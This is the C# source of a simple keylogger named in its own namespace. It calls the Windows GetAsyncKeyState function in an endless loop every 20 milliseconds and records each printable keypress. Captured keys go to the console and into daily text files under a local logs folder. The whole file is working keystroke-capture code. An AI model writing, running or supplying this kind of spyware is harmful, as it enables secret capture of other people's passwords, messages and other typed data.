using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace CSharp_Simple_Keylogger
{
    internal class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static void Main(string[] args)
        {
            if (Directory.Exists("./logs"))
            {

            }
            else
            {
                Directory.CreateDirectory("./logs");
            }

            while (true)
            {
                Thread.Sleep(20);

                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                        Console.Write((char)i);

                        using (StreamWriter writer = File.AppendText($"./logs/{DateTime.UtcNow.ToString("MM-dd-yyyy")}.txt"))
                        {
                            writer.Write((char)i);
                        }
                    }
                }
            }
        }
    }
}
